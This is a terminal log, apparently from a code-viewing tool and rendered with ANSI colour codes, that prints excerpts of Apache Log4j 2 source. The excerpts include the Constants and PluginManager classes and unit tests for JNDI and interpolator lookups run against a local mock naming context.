[2;36m                    [0m         [1;36m75[0m[39m:     * @param clazz The Class each match must be an instance of.[0m                 [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:    public [0m[1;35mPluginManager[0m[1;39m([0m[39mfinal String type, final Class<?> clazz[0m[1;39m)[0m[39m [0m[1;39m{[0m              [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        this.type = type;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:        this.clazz = clazz;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/helpers/Constants.jav[0m[1;92ma:1[0m[39m-[0m[1;36m58[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.helpers;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.util.PropertiesUtil;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m: * Log4j Constants.[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:public final class Constants [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:     * Name of the system property to use to identify the LogEvent factory.[0m      [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:    public static final String LOG4J_LOG_EVENT_FACTORY = [0m[32m"Log4jLogEventFactory"[0m[39m;[0m [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     * Name of the system property to use to identify the ContextSelector Class.[0m [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    public static final String LOG4J_CONTEXT_SELECTOR = [0m[32m"Log4jContextSelector"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    public static final String LOG4J_DEFAULT_STATUS_LEVEL = [0m                     [2m                [0m
[2;36m                    [0m         [32m"Log4jDefaultStatusLevel"[0m[39m;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * JNDI context name string literal.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    public static final String JNDI_CONTEXT_NAME = [0m                              [2m                [0m
[2;36m                    [0m         [32m"java:comp/env/log4j/context-name"[0m[39m;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     * Line separator.[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    public static final String LINE_SEP = [0m                                       [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m[1;35m.getStringProperty[0m[1;39m([0m[32m"line.separator"[0m[39m, [0m[32m"\n"[0m[1;39m)[0m[39m;[0m           [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * Number of milliseconds in a second.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    public static final int MILLIS_IN_SECONDS = [0m[1;36m1000[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     * Prevent class instantiation.[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    private [0m[1;35mConstants[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/test/java/org/apache/logging/log4j/core/lookup/JndiLookupTest.jav[0m[1;92ma:34[0m[39m-[0m[1;36m67[0m   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:public class JndiLookupTest [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    private static final String TEST_CONTEXT_RESOURCE_NAME = [0m                    [2m                [0m
[2;36m                    [0m         [32m"logging/context-name"[0m[39m;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:    private static final String TEST_CONTEXT_NAME = [0m[32m"app-1"[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:    @Before[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    public void [0m[1;35mbefore[0m[1;39m([0m[1;39m)[0m[39m throws NamingException [0m[1;39m{[0m                                [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        [0m[1;35mMockContextFactory.setAsInitial[0m[1;39m([0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        Context context = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        [0m[1;35mcontext.bind[0m[1;39m([0m[39mJndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + [0m           [2m                [0m
[2;36m                    [0m         [39mTEST_CONTEXT_RESOURCE_NAME, TEST_CONTEXT_NAME[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    @After[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    public void [0m[1;35mafter[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        [0m[1;35mMockContextFactory.revertSetAsInitial[0m[1;39m([0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    @Test[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    public void [0m[1;35mtestLookup[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:        if [0m[1;39m([0m[39m! [0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:            return;[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        final StrLookup lookup = new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        String contextName = [0m[1;35mlookup.lookup[0m[1;39m([0m[39mTEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, contextName[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        contextName = [0m                                                           [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mJndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + [0m                     [2m                [0m
[2;36m                    [0m         [39mTEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, contextName[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        String nonExistingResource = [0m                                            [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[32m"logging/non-existing-resource"[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35massertNull[0m[1;39m([0m[39mnonExistingResource[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/test/java/org/apache/logging/log4j/core/lookup/InterpolatorTest.jav[0m[1;92ma:39[0m[39m-[0m[1;36m10[0m [2m                [0m
[2;36m                    [0m         [1;36m0[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:public class InterpolatorTest [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    private static final String TESTKEY = [0m[32m"TestKey"[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    private static final String TESTVAL = [0m[32m"TestValue"[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    private static final String TEST_CONTEXT_RESOURCE_NAME = [0m                    [2m                [0m
[2;36m                    [0m         [32m"logging/context-name"[0m[39m;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:    private static final String TEST_CONTEXT_NAME = [0m[32m"app-1"[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    @BeforeClass[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:    public static void [0m[1;35mbefore[0m[1;39m([0m[1;39m)[0m[39m throws NamingException [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:        [0m[1;35mSystem.setProperty[0m[1;39m([0m[39mTESTKEY, TESTVAL[0m[1;39m)[0m[39m;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:        [0m[1;35mMockContextFactory.setAsInitial[0m[1;39m([0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:        Context context = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:        [0m[1;35mcontext.bind[0m[1;39m([0m[39mJndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + [0m           [2m                [0m
[2;36m                    [0m         [39mTEST_CONTEXT_RESOURCE_NAME, TEST_CONTEXT_NAME[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    @AfterClass[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    public static void [0m[1;35mafter[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        [0m[1;35mMockContextFactory.revertSetAsInitial[0m[1;39m([0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:        [0m[1;35mSystem.clearProperty[0m[1;39m([0m[39mTESTKEY[0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:    @Test[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    public void [0m[1;35mtestLookup[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        if [0m[1;39m([0m[39m! [0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:            return;[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        final Map<String, String> map = new HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[39m;[0m           [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:        [0m[1;35mmap.put[0m[1;39m([0m[39mTESTKEY, TESTVAL[0m[1;39m)[0m[39m;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:        final StrLookup lookup = new [0m[1;35mInterpolator[0m[1;39m([0m[39mnew [0m[1;35mMapLookup[0m[1;39m([0m[39mmap[0m[1;39m)[0m[1;39m)[0m[39m;[0m           [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:        [0m[1;35mThreadContext.put[0m[1;39m([0m[39mTESTKEY, TESTVAL[0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:        String value = [0m[1;35mlookup.lookup[0m[1;39m([0m[39mTESTKEY[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTESTVAL, value[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"ctx:"[0m[39m + TESTKEY[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTESTVAL, value[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"sys:"[0m[39m + TESTKEY[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTESTVAL, value[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"BadKey"[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:        [0m[1;35massertNull[0m[1;39m([0m[39mvalue[0m[1;39m)[0m[39m;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:        [0m[1;35mThreadContext.clear[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"ctx:"[0m[39m + TESTKEY[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTESTVAL, value[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"jndi:"[0m[39m + TEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, value[0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    @Test[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:    public void [0m[1;35mtestLookupWithDefaultInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:        if [0m[1;39m([0m[39m! [0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:            return;[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:        final StrLookup lookup = new [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:        String value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"sys:"[0m[39m + TESTKEY[0m[1;39m)[0m[39m;[0m                          [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTESTVAL, value[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"env:PATH"[0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:        [0m[1;35massertNotNull[0m[1;39m([0m[39mvalue[0m[1;39m)[0m[39m;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:        value = [0m[1;35mlookup.lookup[0m[1;39m([0m[32m"jndi:"[0m[39m + TEST_CONTEXT_RESOURCE_NAME[0m[1;39m)[0m[39m;[0m             [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m:        [0m[1;35massertEquals[0m[1;39m([0m[39mTEST_CONTEXT_NAME, value[0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:[0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/plugins/PluginManager.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m80[0m[39m-[0m[1;36m150[0m                                                                              [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:    public static void [0m[1;35mmain[0m[1;39m([0m[39mfinal String[0m[1;39m[[0m[1;39m][0m[39m args[0m[1;39m)[0m[39m throws Exception [0m[1;39m{[0m              [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:        if [0m[1;39m([0m[39margs == null || args.length < [0m[1;36m1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:            [0m[1;35mSystem.err.println[0m[1;39m([0m[32m"A target directory must be specified"[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:            [0m[1;35mSystem.exit[0m[1;39m([0m[1;36m-1[0m[1;39m)[0m[39m;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:        rootDir = args[0m[1;39m[[0m[1;36m0[0m[1;39m][0m[1;35m.endsWith[0m[1;39m([0m[32m"/"[0m[1;39m)[0m[39m || args[0m[1;39m[[0m[1;36m0[0m[1;39m][0m[1;35m.endsWith[0m[1;39m([0m[32m"\\"[0m[32m)[0m[32m ? args[0m[32m[[0m[32m0[0m[32m][0m[32m : [0m   [2m                [0m
[2;36m                    [0m         [32margs[0m[32m[[0m[32m0[0m[32m][0m[32m + "[0m[35m/[0m[39m";[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:        final PluginManager manager = new [0m[1;35mPluginManager[0m[1;39m([0m[32m"Core"[0m[1;39m)[0m[39m;[0m                 [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:        final String packages = args.length == [0m[1;36m2[0m[39m ? args[0m[1;39m[[0m[1;36m1[0m[1;39m][0m[39m : null;[0m               [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:        [0m[1;35mmanager.collectPlugins[0m[1;39m([0m[39mfalse, packages[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:        [0m[1;35mencode[0m[1;39m([0m[39mpluginTypeMap[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:     * Adds a package name to be scanned for plugins. Must be invoked prior to [0m  [2m                [0m
[2;36m                    [0m         [39mplugins being collected.[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m:     * @param p The package name.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:    public static void [0m[1;35maddPackage[0m[1;39m([0m[39mfinal String p[0m[1;39m)[0m[39m [0m[1;39m{[0m                             [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:        if [0m[1;39m([0m[1;35mPACKAGES.addIfAbsent[0m[1;39m([0m[39mp[0m[1;39m)[0m[1;39m)[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:        [0m[1;39m{[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:            [0m[35m/[0m[35m/[0m[95mset[0m[39m of available plugins could have changed, reset plugin cache [0m  [2m                [0m
[2;36m                    [0m         [39mfor newly-retrieved managers[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:            [0m[1;35mpluginTypeMap.clear[0m[1;39m([0m[1;39m)[0m[39m;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:     * Returns the type of a specified plugin.[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:     * @param name The name of the plugin.[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:     * @return The plugin's type.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:    public PluginType [0m[1;35mgetPluginType[0m[1;39m([0m[39mfinal String name[0m[1;39m)[0m[39m [0m[1;39m{[0m                        [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:        return [0m[1;35mplugins.get[0m[1;39m([0m[1;35mname.toLowerCase[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:[0m                                                                                [2m                [0m
